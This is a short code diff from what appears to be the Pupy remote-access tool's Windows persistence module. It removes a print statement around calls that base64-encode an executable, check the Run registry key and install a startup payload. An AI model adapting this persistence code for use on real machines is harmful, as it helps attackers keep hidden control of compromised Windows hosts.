@@ -58,7 +58,7 @@ class PersistenceModule(PupyModule):
 				#encoding binary
 				encoded = base64.b64encode(exebuff)
 				self.info("file registry load ...")
-				print self.client.conn.modules['pupwinutils.persistence'].registry_check('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','C:\\WINDOWS\\system32\\rundll32.exe')
+				self.client.conn.modules['pupwinutils.persistence'].registry_check('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','C:\\WINDOWS\\system32\\rundll32.exe')
 				self.client.conn.modules['pupwinutils.persistence'].javascript_startup(encoded)
 
 			elif args.method=="binary":
